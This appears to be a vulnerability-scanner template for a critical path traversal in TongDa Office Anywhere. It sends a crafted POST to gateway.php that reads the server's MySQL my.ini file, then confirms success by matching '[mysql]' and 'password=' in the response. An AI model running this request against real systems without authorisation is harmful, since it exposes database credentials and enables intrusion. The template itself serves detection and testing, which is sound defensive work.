id: tongda-path-traversal
brief:
    title: Office Anywhere TongDa - Path Traversal
    by: pikpikcu
    level: critical
    about: Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.
    label:
        - tongda
        - lfi
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/ispirit/interface/gateway.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: json={"url":"/general/../../mysql5/my.ini"}
      signs:
        - "on": word
          has:
            - '[mysql]'
            - password=
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
